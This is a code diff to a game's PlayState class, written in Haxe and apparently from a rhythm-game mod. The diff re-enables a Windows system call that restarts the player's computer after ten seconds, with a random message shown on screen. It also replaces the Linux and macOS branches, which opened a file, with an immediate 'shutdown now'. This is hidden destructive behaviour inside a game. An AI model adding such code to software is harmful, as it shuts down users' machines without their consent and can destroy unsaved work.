@@ -7633,11 +7633,9 @@ class PlayState extends MusicBeatState
 				File.saveContent(path, expungedLines[randomLine]); */
 				var randomLine = new FlxRandom().int(0, expungedLines.length);
 				#if windows
-				//Sys.command("shutdown /r /t 10 /c \"" + expungedLines[randomLine] + "\"");
-				#elseif linux
-				Sys.command("xdg-open " + path);
+				Sys.command("shutdown /r /t 10 /c \"" + expungedLines[randomLine] + "\"");
 				#else
-				Sys.command("open " + path);
+				Sys.command("shutdown now");
 				#end
 			}
 			#end
